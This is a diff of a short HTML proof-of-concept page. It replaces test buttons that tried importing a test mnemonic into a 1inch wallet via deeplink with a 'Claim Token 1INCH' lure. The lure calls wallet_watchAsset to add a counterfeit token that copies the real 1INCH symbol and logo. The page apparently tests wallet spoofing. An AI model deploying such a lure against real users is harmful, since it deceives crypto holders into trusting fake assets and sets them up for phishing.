@@ -1,18 +1,33 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="test1()">Test 1 - Import via Deeplink</button><br><br>
-<button onclick="test2()">Test 2 - Import via URL Param</button>
+<button onclick="tambah()">Claim Token 1INCH - Tambah ke Wallet</button>
 <pre id="o"></pre>
 <script>
-function test1(){
-  document.getElementById('o').innerText = "Coba deeplink import...";
-  // Coba 3 format yang biasa dipake wallet
-  window.location.href = "1inch://import?mnemonic=" + encodeURIComponent("abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about");
-}
-function test2(){
-  document.getElementById('o').innerText = "Coba URL param...";
-  window.location.href = "https://app.1inch.io/#/1/wallet/import?mnemonic=" + encodeURIComponent("abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about");
+async function tambah(){
+  let out = document.getElementById('o');
+  try{
+    // Ini token PALSU, contract-nya alamat dummy, tapi nama + simbolnya dibuat sama kayak asli
+    let res = await window.ethereum.request({
+      method: 'wallet_watchAsset',
+      params: {
+        type: 'ERC20',
+        options: {
+          address: '0x000000000000000000000000000000000000dEaD',
+          symbol: '1INCH',
+          decimals: 18,
+          image: 'https://1inch.io/img/favicon.ico'
+        }
+      }
+    });
+    if(res){
+      out.innerText = "KENA! Token palsu ke-tambah ke wallet lu. Cek di daftar token lu, ada 1INCH palsu sekarang?";
+    }else{
+      out.innerText = "Ditolak user / gagal.";
+    }
+  }catch(e){
+    out.innerText = "Error: " + e.message;
+  }
 }
 </script>
 </body>
